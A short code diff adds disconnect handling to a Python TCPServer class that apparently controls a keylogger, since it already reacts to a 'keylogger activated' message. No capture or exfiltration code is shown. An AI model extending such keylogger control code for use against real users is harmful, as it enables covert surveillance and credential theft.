@@ -206,6 +206,10 @@ class TCPServer:
         if message == "User authenticated.":
             self._authenticated = True
             print("[AUTHENTICATION] Server authenticated successfully.")
+        elif message == "User successfully disconnected.":
+            self._authenticated = False
+            print("[AUTHENTICATION] User disconnected.")
+
         elif message == "keylogger activated":
             self._klg_on = True
             print("[KLG] Keylogger activated.")
